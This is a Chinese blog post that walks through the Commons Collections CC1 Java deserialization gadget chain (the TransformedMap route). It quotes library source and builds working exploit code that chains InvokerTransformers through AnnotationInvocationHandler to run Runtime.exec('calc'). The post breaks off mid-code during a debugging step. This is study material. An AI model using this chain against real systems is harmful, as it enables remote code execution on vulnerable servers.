---
title: "cc1链学习"
date: "2026-11-01 21:30:09"
updated: "2026-11-01 21:30:09"
permalink: "2026/11/01/cc1-transformedmap/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC1"]
description: "从 Transformer 接口开始，记录 TransformedMap 路径的源码追踪、实验与调试过程。"
excerpt: "从 Transformer 接口开始，记录 TransformedMap 路径的源码追踪、实验与调试过程。"
obsidian_source: "cc1链学习.md"
---

## 从 Transformer 接口入手

根据前人挖洞的审核，我们从Transformer这个接口入口，我们发现这个这个接口很简单，输入一个内容然后执行方法
```java
public interface Transformer {  
  
    /**  
     * Transforms the input object (leaving it unchanged) into some output object.     *     * @param input  the object to be transformed, should be left unchanged  
     * @return a transformed object  
     * @throws ClassCastException (runtime) if the input is the wrong class  
     * @throws IllegalArgumentException (runtime) if the input is invalid  
     * @throws FunctorException (runtime) if the transform cannot be completed  
     */    public Object transform(Object input);  
  
}
```
我们查找这个接口的具体实现类，我们发现有很多，先看chain的类
```java
/*  
 *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the "License"); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an "AS IS" BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.functors;  
  
import java.io.Serializable;  
import java.util.Collection;  
import java.util.Iterator;  
  
import org.apache.commons.collections.Transformer;  
  
/**  
 * Transformer implementation that chains the specified transformers together. * <p>  
 * The input object is passed to the first transformer. The transformed result  
 * is passed to the second transformer and so on. ** @since Commons Collections 3.0  
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  
 * * @author Stephen Colebourne  
 */public class ChainedTransformer implements Transformer, Serializable {  
  
    /** Serial version UID */  
    private static final long serialVersionUID = 3514945074733160196L;  
  
    /** The transformers to call in turn */  
    private final Transformer[] iTransformers;  
  
    /**  
     * Factory method that performs validation and copies the parameter array.     ** @param transformers  the transformers to chain, copied, no nulls  
     * @return the <code>chained</code> transformer  
     * @throws IllegalArgumentException if the transformers array is null  
     * @throws IllegalArgumentException if any transformer in the array is null  
     */    public static Transformer getInstance(Transformer[] transformers) {  
        FunctorUtils.validate(transformers);  
        if (transformers.length == 0) {  
            return NOPTransformer.INSTANCE;  
        }  
        transformers = FunctorUtils.copy(transformers);  
        return new ChainedTransformer(transformers);  
    }  
      
    /**  
     * Create a new Transformer that calls each transformer in turn, passing the     * result into the next transformer. The ordering is that of the iterator()  
     * method on the collection.     ** @param transformers  a collection of transformers to chain  
     * @return the <code>chained</code> transformer  
     * @throws IllegalArgumentException if the transformers collection is null  
     * @throws IllegalArgumentException if any transformer in the collection is null  
     */    public static Transformer getInstance(Collection transformers) {  
        if (transformers == null) {  
            throw new IllegalArgumentException("Transformer collection must not be null");  
        }  
        if (transformers.size() == 0) {  
            return NOPTransformer.INSTANCE;  
        }  
        // convert to array like this to guarantee iterator() ordering  
        Transformer[] cmds = new Transformer[transformers.size()];  
        int i = 0;  
        for (Iterator it = transformers.iterator(); it.hasNext();) {  
            cmds[i++] = (Transformer) it.next();  
        }  
        FunctorUtils.validate(cmds);  
        return new ChainedTransformer(cmds);  
    }  
  
    /**  
     * Factory method that performs validation.     ** @param transformer1  the first transformer, not null  
     * @param transformer2  the second transformer, not null  
     * @return the <code>chained</code> transformer  
     * @throws IllegalArgumentException if either transformer is null  
     */    public static Transformer getInstance(Transformer transformer1, Transformer transformer2) {  
        if (transformer1 == null || transformer2 == null) {  
            throw new IllegalArgumentException("Transformers must not be null");  
        }  
        Transformer[] transformers = new Transformer[] { transformer1, transformer2 };  
        return new ChainedTransformer(transformers);  
    }  
  
    /**  
     * Constructor that performs no validation.     * Use <code>getInstance</code> if you want that.  
     ** @param transformers  the transformers to chain, not copied, no nulls  
     */    public ChainedTransformer(Transformer[] transformers) {  
        super();  
        iTransformers = transformers;  
    }  
  
    /**  
     * Transforms the input to result via each decorated transformer     ** @param object  the input object passed to the first transformer  
     * @return the transformed result  
     */    public Object transform(Object object) {  
        for (int i = 0; i < iTransformers.length; i++) {  
            object = iTransformers[i].transform(object);  
        }  
        return object;  
    }  
  
    /**  
     * Gets the transformers, do not modify the array.     * @return the transformers  
     * @since Commons Collections 3.1  
     */    public Transformer[] getTransformers() {  
        return iTransformers;  
    }  
  
}
```

## InvokerTransformer 与命令执行

实现功能吧不同的transformer类连成一个链，前一个的结果是后一个的输入，但是我们没有找到可以直接执行危险命令的地方，接下来我们看invoke的类

我们首先是要发现一个能执行危险函数的地方，也就是能执行exec的地方，java里执行exec是Runtime类里面的一个方法。

```java
/*  
 *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the "License"); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an "AS IS" BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.functors;  
  
import java.io.Serializable;  
import java.lang.reflect.InvocationTargetException;  
import java.lang.reflect.Method;  
  
import org.apache.commons.collections.FunctorException;  
import org.apache.commons.collections.Transformer;  
  
/**  
 * Transformer implementation that creates a new object instance by reflection. ** @since Commons Collections 3.0  
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  
 * * @author Stephen Colebourne  
 */public class InvokerTransformer implements Transformer, Serializable {  
  
    /** The serial version */  
    private static final long serialVersionUID = -8653385846894047688L;  
      
    /** The method name to call */  
    private final String iMethodName;  
    /** The array of reflection parameter types */  
    private final Class[] iParamTypes;  
    /** The array of reflection arguments */  
    private final Object[] iArgs;  
  
    /**  
     * Gets an instance of this transformer calling a specific method with no arguments.     ** @param methodName  the method name to call  
     * @return an invoker transformer  
     * @since Commons Collections 3.1  
     */    public static Transformer getInstance(String methodName) {  
        if (methodName == null) {  
            throw new IllegalArgumentException("The method to invoke must not be null");  
        }  
        return new InvokerTransformer(methodName);  
    }  
  
    /**  
     * Gets an instance of this transformer calling a specific method with specific values.     ** @param methodName  the method name to call  
     * @param paramTypes  the parameter types of the method  
     * @param args  the arguments to pass to the method  
     * @return an invoker transformer  
     */    public static Transformer getInstance(String methodName, Class[] paramTypes, Object[] args) {  
        if (methodName == null) {  
            throw new IllegalArgumentException("The method to invoke must not be null");  
        }  
        if (((paramTypes == null) && (args != null))  
            || ((paramTypes != null) && (args == null))  
            || ((paramTypes != null) && (args != null) && (paramTypes.length != args.length))) {  
            throw new IllegalArgumentException("The parameter types must match the arguments");  
        }  
        if (paramTypes == null || paramTypes.length == 0) {  
            return new InvokerTransformer(methodName);  
        } else {  
            paramTypes = (Class[]) paramTypes.clone();  
            args = (Object[]) args.clone();  
            return new InvokerTransformer(methodName, paramTypes, args);  
        }  
    }  
  
    /**  
     * Constructor for no arg instance.     ** @param methodName  the method to call  
     */    private InvokerTransformer(String methodName) {  
        super();  
        iMethodName = methodName;  
        iParamTypes = null;  
        iArgs = null;  
    }  
  
    /**  
     * Constructor that performs no validation.     * Use <code>getInstance</code> if you want that.  
     ** @param methodName  the method to call  
     * @param paramTypes  the constructor parameter types, not cloned  
     * @param args  the constructor arguments, not cloned  
     */    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {  
        super();  
        iMethodName = methodName;  
        iParamTypes = paramTypes;  
        iArgs = args;  
    }  
  
    /**  
     * Transforms the input to result by invoking a method on the input.     ** @param input  the input object to transform  
     * @return the transformed result, null if null input  
     */    public Object transform(Object input) {  
        if (input == null) {  
            return null;  
        }  
        try {  
            Class cls = input.getClass();  
            Method method = cls.getMethod(iMethodName, iParamTypes);  
            return method.invoke(input, iArgs);  
                  
        } catch (NoSuchMethodException ex) {  
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");  
        } catch (IllegalAccessException ex) {  
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");  
        } catch (InvocationTargetException ex) {  
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);  
        }  
    }  
  
}
```
我们观察一下这个invoketransformer
他有两个构造方法，一个是传入方法名进行构造，这是是私有的，另一个是传入方法名，参数类型以及参数值进行构造，这个方法是公有的。
还有根据参数的不同形成的几个工厂方法
然后我们看他这里是怎么实现这个transformer方法的。
这个方法要有一个输入，根据这个输入确定Class，然后通过反射去执行这个命令
```java
public Object transform(Object input) {  
    if (input == null) {  
        return null;  
    }  
    try {  
        Class cls = input.getClass();  
        Method method = cls.getMethod(iMethodName, iParamTypes);  
        return method.invoke(input, iArgs);
```
到这一步我们就发现了我们貌似可以通过这个方法实现任意命令的一个执行，我们先写一个简单的测试一下。

```java
public class CC1Step1 {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        invokerTransformer.transform(runtime);  
  
    }  
}
```

我们创建一个Runtime，然后实例化一个InvokeTransformer，调用他的transformer方法这样就实现了我们执行任意命令的目的，这也就是利用链的链尾部分。

## 寻找 Transformer 的调用位置

我们为了形成一个完整的攻击链，从攻击者的角度考虑，服务端只给我们提供了一个反序列化的入口，所以我们上传的是一个序列化的数据，一般来说能序列化的就是对象和集合，所以很明显我们要找谁调用了transformer这个方法。

然后我们发现在TransformerMap这个类里面有三个方法都调用了这个方法。

```java
/*  
 *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the "License"); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an "AS IS" BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;  
  
import java.io.IOException;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.io.Serializable;  
import java.util.Iterator;  
import java.util.Map;  
  
import org.apache.commons.collections.Transformer;  
  
/**  
 * Decorates another <code>Map</code> to transform objects that are added.  
 * <p>  
 * The Map put methods and Map.Entry setValue method are affected by this class.  
 * Thus objects must be removed or searched for using their transformed form. * For example, if the transformation converts Strings to Integers, you must * use the Integer form to remove objects. * <p>  
 * <strong>Note that TransformedMap is not synchronized and is not thread-safe.</strong>  
 * If you wish to use this map from multiple threads concurrently, you must use  
 * appropriate synchronization. The simplest approach is to wrap this map * using {@link java.util.Collections#synchronizedMap(Map)}. This class may throw   
 * exceptions when accessed by concurrent threads without synchronization.  
 * <p>  
 * This class is Serializable from Commons Collections 3.1.  
 * * @since Commons Collections 3.0  
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  
 ** @author Stephen Colebourne  
 */public class TransformedMap  
        extends AbstractInputCheckedMapDecorator  
        implements Serializable {  
  
    /** Serialization version */  
    private static final long serialVersionUID = 7023152376788900464L;  
  
    /** The transformer to use for the key */  
    protected final Transformer keyTransformer;  
    /** The transformer to use for the value */  
    protected final Transformer valueTransformer;  
  
    /**  
     * Factory method to create a transforming map.     * <p>  
     * If there are any elements already in the map being decorated, they  
     * are NOT transformed.     * Constrast this with {@link #decorateTransform}.  
     ** @param map  the map to decorate, must not be null  
     * @param keyTransformer  the transformer to use for key conversion, null means no transformation  
     * @param valueTransformer  the transformer to use for value conversion, null means no transformation  
     * @throws IllegalArgumentException if map is null  
     */    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
        return new TransformedMap(map, keyTransformer, valueTransformer);  
    }  
  
    /**  
     * Factory method to create a transforming map that will transform     * existing contents of the specified map.     * <p>  
     * If there are any elements already in the map being decorated, they  
     * will be transformed by this method.     * Constrast this with {@link #decorate}.  
     ** @param map  the map to decorate, must not be null  
     * @param keyTransformer  the transformer to use for key conversion, null means no transformation  
     * @param valueTransformer  the transformer to use for value conversion, null means no transformation  
     * @throws IllegalArgumentException if map is null  
     * @since Commons Collections 3.2  
     */    public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
        TransformedMap decorated = new TransformedMap(map, keyTransformer, valueTransformer);  
        if (map.size() > 0) {  
            Map transformed = decorated.transformMap(map);  
            decorated.clear();  
            decorated.getMap().putAll(transformed);  // avoids double transformation  
        }  
        return decorated;  
    }  
  
    //-----------------------------------------------------------------------  
    /**  
     * Constructor that wraps (not copies).     * <p>  
     * If there are any elements already in the collection being decorated, they  
     * are NOT transformed.     ** @param map  the map to decorate, must not be null  
     * @param keyTransformer  the transformer to use for key conversion, null means no conversion  
     * @param valueTransformer  the transformer to use for value conversion, null means no conversion  
     * @throws IllegalArgumentException if map is null  
     */    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {  
        super(map);  
        this.keyTransformer = keyTransformer;  
        this.valueTransformer = valueTransformer;  
    }  
  
    //-----------------------------------------------------------------------  
    /**  
     * Write the map out using a custom routine.     ** @param out  the output stream  
     * @throws IOException  
     * @since Commons Collections 3.1  
     */    private void writeObject(ObjectOutputStream out) throws IOException {  
        out.defaultWriteObject();  
        out.writeObject(map);  
    }  
  
    /**  
     * Read the map in using a custom routine.     ** @param in  the input stream  
     * @throws IOException  
     * @throws ClassNotFoundException  
     * @since Commons Collections 3.1  
     */    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {  
        in.defaultReadObject();  
        map = (Map) in.readObject();  
    }  
  
    //-----------------------------------------------------------------------  
    /**  
     * Transforms a key.     * <p>  
     * The transformer itself may throw an exception if necessary.  
     ** @param object  the object to transform  
     * @throws the transformed object  
     */    protected Object transformKey(Object object) {  
        if (keyTransformer == null) {  
            return object;  
        }  
        return keyTransformer.transform(object);  
    }  
  
    /**  
     * Transforms a value.     * <p>  
     * The transformer itself may throw an exception if necessary.  
     ** @param object  the object to transform  
     * @throws the transformed object  
     */    protected Object transformValue(Object object) {  
        if (valueTransformer == null) {  
            return object;  
        }  
        return valueTransformer.transform(object);  
    }  
  
    /**  
     * Transforms a map.     * <p>  
     * The transformer itself may throw an exception if necessary.  
     ** @param map  the map to transform  
     * @throws the transformed object  
     */    protected Map transformMap(Map map) {  
        if (map.isEmpty()) {  
            return map;  
        }  
        Map result = new LinkedMap(map.size());  
        for (Iterator it = map.entrySet().iterator(); it.hasNext(); ) {  
            Map.Entry entry = (Map.Entry) it.next();  
            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));  
        }  
        return result;  
    }  
  
    /**  
     * Override to transform the value when using <code>setValue</code>.  
     ** @param value  the value to transform  
     * @return the transformed value  
     * @since Commons Collections 3.1  
     */    protected Object checkSetValue(Object value) {  
        return valueTransformer.transform(value);  
    }  
  
    /**  
     * Override to only return true when there is a value transformer.     ** @return true if a value transformer is in use  
     * @since Commons Collections 3.1  
     */    protected boolean isSetValueChecking() {  
        return (valueTransformer != null);  
    }  
  
    //-----------------------------------------------------------------------  
    public Object put(Object key, Object value) {  
        key = transformKey(key);  
        value = transformValue(value);  
        return getMap().put(key, value);  
    }  
  
    public void putAll(Map mapToCopy) {  
        mapToCopy = transformMap(mapToCopy);  
        getMap().putAll(mapToCopy);  
    }  
  
}
```

我们稍微理解一下这段代码，这个类继承自AbstractInputCheckedMapDecorator，是可以被序列化的，这个类接收两个参数这两个参数都是Transformer
我们发现这个类的构造方法是protected的，但是提供了一个静态方法用来实例化对象
我们发现这个类里面的checkSetValue方法调用了Transformer这个方法，我们只要让这个value是Runtime就可以了，我们写个简单的exp试一试。

```java
public class CC1Step1 {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        invokerTransformer.transform(runtime);  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
        Map decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);  
        Class<? extends Map> aClass = decorate.getClass();  
        Method checkSetValue = aClass.getDeclaredMethod("checkSetValue",Object.class);  
        checkSetValue.setAccessible(true);  
        checkSetValue.invoke(decorate,runtime);    
  
  
  
    }  
}
```
这段代码我绕了好久才明白，我们的目的是使用这个transformer，并且使用这个transformer的是一个invoke的transformer，这样的话才能自然而然的调用他那个类里重写的方法，我们找到的这段函数是valuetransformer去调用，那么我们就要让valuetransformer是invoketransformer，所以我们把这个对象的第三个参数设置成这个，value的参数自然是Runtime，这样就可以实现我们的命令了。
这一步我们总结出来的道理就是我们要找到谁使用了这个transformer方法，我们要保证使用这个方法的可以是invoketransformer，好像有点像废话，肯定只有transformer的参数才能用这个方法啊。我们接着往下找吧。

我们只能创建对象或者集合，所以我们就要找谁使用了这个decorate这个方法，遗憾的是这条路是走不通的，这种情况意味着我们不能实例化这个对象了，因为decorate我们不能使用，所以我们就只能找还有哪个类调用了checkvalue这个方法。


## AbstractInputCheckedMapDecorator 与 setValue

我们发现只有一个调用了这个方法，就是AbstractInputCheckedMapDecorator类

```java
/*  
 *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the "License"); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an "AS IS" BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;  
  
import java.lang.reflect.Array;  
import java.util.Iterator;  
import java.util.Map;  
import java.util.Set;  
  
import org.apache.commons.collections.iterators.AbstractIteratorDecorator;  
import org.apache.commons.collections.keyvalue.AbstractMapEntryDecorator;  
import org.apache.commons.collections.set.AbstractSetDecorator;  
  
/**  
 * An abstract base class that simplifies the task of creating map decorators. * <p>  
 * The Map API is very difficult to decorate correctly, and involves implementing  
 * lots of different classes. This class exists to provide a simpler API. * <p>  
 * Special hook methods are provided that are called when objects are added to  
 * the map. By overriding these methods, the input can be validated or manipulated. * In addition to the main map methods, the entrySet is also affected, which is * the hardest part of writing map implementations. * <p>  
 * This class is package-scoped, and may be withdrawn or replaced in future  
 * versions of Commons Collections. * * @since Commons Collections 3.1  
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  
 ** @author Stephen Colebourne  
 */abstract class AbstractInputCheckedMapDecorator  
        extends AbstractMapDecorator {  
  
    /**  
     * Constructor only used in deserialization, do not use otherwise.     */    protected AbstractInputCheckedMapDecorator() {  
        super();  
    }  
  
    /**  
     * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null  
     * @throws IllegalArgumentException if map is null  
     */    protected AbstractInputCheckedMapDecorator(Map map) {  
        super(map);  
    }  
  
    //-----------------------------------------------------------------------  
    /**  
     * Hook method called when a value is being set using <code>setValue</code>.  
     * <p>  
     * An implementation may validate the value and throw an exception  
     * or it may transform the value into another object.     * <p>  
     * This implementation returns the input value.  
     ** @param value  the value to check  
     * @throws UnsupportedOperationException if the map may not be changed by setValue  
     * @throws IllegalArgumentException if the specified value is invalid  
     * @throws ClassCastException if the class of the specified value is invalid  
     * @throws NullPointerException if the specified value is null and nulls are invalid  
     */    protected abstract Object checkSetValue(Object value);  
  
    /**  
     * Hook method called to determine if <code>checkSetValue</code> has any effect.  
     * <p>  
     * An implementation should return false if the <code>checkSetValue</code> method  
     * has no effect as this optimises the implementation.     * <p>  
     * This implementation returns <code>true</code>.  
     ** @return true always  
     */    protected boolean isSetValueChecking() {  
        return true;  
    }  
  
    //-----------------------------------------------------------------------  
    public Set entrySet() {  
        if (isSetValueChecking()) {  
            return new EntrySet(map.entrySet(), this);  
        } else {  
            return map.entrySet();  
        }  
    }  
  
    //-----------------------------------------------------------------------  
    /**  
     * Implementation of an entry set that checks additions via setValue.     */    static class EntrySet extends AbstractSetDecorator {  
          
        /** The parent map */  
        private final AbstractInputCheckedMapDecorator parent;  
  
        protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) {  
            super(set);  
            this.parent = parent;  
        }  
  
        public Iterator iterator() {  
            return new EntrySetIterator(collection.iterator(), parent);  
        }  
          
        public Object[] toArray() {  
            Object[] array = collection.toArray();  
            for (int i = 0; i < array.length; i++) {  
                array[i] = new MapEntry((Map.Entry) array[i], parent);  
            }  
            return array;  
        }  
          
        public Object[] toArray(Object array[]) {  
            Object[] result = array;  
            if (array.length > 0) {  
                // we must create a new array to handle multi-threaded situations  
                // where another thread could access data before we decorate it                result = (Object[]) Array.newInstance(array.getClass().getComponentType(), 0);  
            }  
            result = collection.toArray(result);  
            for (int i = 0; i < result.length; i++) {  
                result[i] = new MapEntry((Map.Entry) result[i], parent);  
            }  
  
            // check to see if result should be returned straight  
            if (result.length > array.length) {  
                return result;  
            }  
  
            // copy back into input array to fulfil the method contract  
            System.arraycopy(result, 0, array, 0, result.length);  
            if (array.length > result.length) {  
                array[result.length] = null;  
            }  
            return array;  
        }  
    }  
  
    /**  
     * Implementation of an entry set iterator that checks additions via setValue.     */    static class EntrySetIterator extends AbstractIteratorDecorator {  
          
        /** The parent map */  
        private final AbstractInputCheckedMapDecorator parent;  
          
        protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) {  
            super(iterator);  
            this.parent = parent;  
        }  
          
        public Object next() {  
            Map.Entry entry = (Map.Entry) iterator.next();  
            return new MapEntry(entry, parent);  
        }  
    }  
  
    /**  
     * Implementation of a map entry that checks additions via setValue.     */    static class MapEntry extends AbstractMapEntryDecorator {  
  
        /** The parent map */  
        private final AbstractInputCheckedMapDecorator parent;  
  
        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {  
            super(entry);  
            this.parent = parent;  
        }  
  
        public Object setValue(Object value) {  
            value = parent.checkSetValue(value);  
            return entry.setValue(value);  
        }  
    }  
  
}
```
这段代码很长，我们看到这是一个抽象类是不能实例化的，同时还没有public是不能直接访问的。很显然是他的子类在调用setvalue的时候会调用checksetvalue这个方法，所以接下来我们验证一下执行这个setvalue会不会触发调用。
```java
protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {  
    super(entry);  
    this.parent = parent;  
}  
  
public Object setValue(Object value) {  
    value = parent.checkSetValue(value);  
    return entry.setValue(value);  
}
```
我们不难发现，这里需要的对象是Map.Entry，我们新建的map是不能直接调用这个方法的，所以我们需要先进行一个遍历取出这个entry之后再能进行调用
```java
public class CC1Step1 {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        invokerTransformer.transform(runtime);  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
        objectObjectHashMap.put("name","hello");  
        Map<Object,Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);  
//        Class<? extends Map> aClass = decorate.getClass();  
//        Method checkSetValue = aClass.getDeclaredMethod("checkSetValue",Object.class);  
//        checkSetValue.setAccessible(true);  
//        checkSetValue.invoke(decorate,runtime);  
        for (Map.Entry entry : decorate.entrySet()){  
            entry.setValue(runtime);  
  
        }  
    }  
}
```

## 进入 AnnotationInvocationHandler

我们发现成功弹计算器，证明是可以正常调用的，接下来我们的目标就是谁调用了这个setvalue我们发现AnnotationInvocationHandler这个类的readobject调用了这个，那我们只要实例化这个类的对象然后再进行反序列化就完成目标了，终于要走到尽头了吗。
接下来我们先把完整的exp写出来然后再进行修正。
 AnnotationInvocationHandler这个类的代码非常长我就不贴出来了
这个类继承自InvocationHandler，可以被序列化，有两个参数一个是type也就是注解，另一个就是map。

这个类是deafult的，也只能通过反射进行获取我们先本写exp吧

```java
public class CC1Step1 {  
    public static void main(String[] args) throws Exception {  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
//        invokerTransformer.transform(runtime);  
        HashMap<Object, Object> objectObjectHashMap = new HashMap<>();  
        objectObjectHashMap.put("name","hello");  
        Map<Object,Object> decorate = TransformedMap.decorate(objectObjectHashMap, null, invokerTransformer);  
//        Class<? extends Map> aClass = decorate.getClass();  
//        Method checkSetValue = aClass.getDeclaredMethod("checkSetValue",Object.class);  
//        checkSetValue.setAccessible(true);  
//        checkSetValue.invoke(decorate,runtime);  
        Class<?> bClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> declaredConstructor = bClass.getDeclaredConstructor(Class.class, Map.class);  
        declaredConstructor.setAccessible(true);  
        Object o = declaredConstructor.newInstance(Override.class, objectObjectHashMap);  
  
    }  
}
```

## 通过反射组织调用链

接下来我们要解决一个问题，Runtime是不能序列化的。
我们可以先使用反射的方式实现命令执行
```java
Class<Runtime> runtimeClass = Runtime.class;  
Method getRuntime = runtimeClass.getMethod("getRuntime");  
Object invoke = getRuntime.invoke(null, null);  
Method exec = runtimeClass.getMethod("exec", String.class);  
exec.invoke(invoke,"calc");
```
然后我们改成使用invoketransformer来实现
```java
Object o1 = new InvokerTransformer(  
        "getMethod",  
        new Class[]{String.class, Class[].class},  
        new Object[]{"getRuntime", new Class[0]}  
).transform(Runtime.class);//(Runtime.class).getMethod("getRuntime") --> method  
  
Object invoke1 = new InvokerTransformer(  
        "invoke",  
        new Class[]{Object.class, Object[].class},  
        new Object[]{null, new Object[0]}  
).transform(o1);//o1.invoke(null,null)  --> 相当于创建一个runtime实例  
Object getMethod = new InvokerTransformer(  
        "getMethod",  
        new Class[]{String.class, Class[].class},  
        new Object[]{"exec", String.class}  
).transform(invoke1);//invoke1.getmethod("exec",String.class) -->获取到exec这个方法  
new InvokerTransformer(  
        "invoke",  
        new Class[]{Object.class, Object[].class},  
        new Object[]{invoke1, "calc"}  
).transform(getMethod);//exec.invoke(invoke1,"calc")
```
这里逻辑还是挺绕的我们要理解
o.transformer(input)-->input.methodname(newobject[])

换成用chaintransformer表述
```text
Transformer[] transformers = new Transformer[]{
                // 起点：无视输入，固定返回 Runtime.class
                new ConstantTransformer(Runtime.class),
                // 第1步：Runtime.class.getMethod("getRuntime") → Method
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                // 第2步：Method.invoke(null) → Runtime 实例
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                // 第3步：Runtime 实例.exec("calc") → 直接执行，不再找 exec
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        Transformer chain = new ChainedTransformer(transformers);
        // 触发：输入任意值（会被 ConstantTransformer 丢弃）
        chain.transform("随便什么");
```

## 构造完整实验代码

最终得到一个完整的exp
```java
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.util.HashMap;  
import java.util.Map;  
  
// 解决了第一个问题  
public class CC1Step1 {  
    public static void main(String[] args) throws Exception {  
        Transformer[] transformers = new Transformer[]{  
                new InvokerTransformer("getMethod"  
                        , new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),  
                new InvokerTransformer("exec"  
                        , new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("key","value");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        aihConstructor.setAccessible(true);  
        Object o = aihConstructor.newInstance(Override.class, transformedMap);  
  
        // 序列化反序列化  
        serialize(o);  
        unserialize("ser.bin");  
    }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
        oos.writeObject(obj);  
    }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
        Object obj = ois.readObject();  
        return obj;  
    }  
}

```

## 断点调试与条件修正

紧接着我们下断点进行调试
```java
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {  
    String name = memberValue.getKey();  
    Class<?> memberType = memberTypes.get(name);  
    if (memberType != null) {  // i.e. member still exists  
        Object value = memberValue.getValue();  
        if (!(memberType.isInstance(value) ||  
              value instanceof ExceptionProxy)) {  
            memberValue.setValue(  
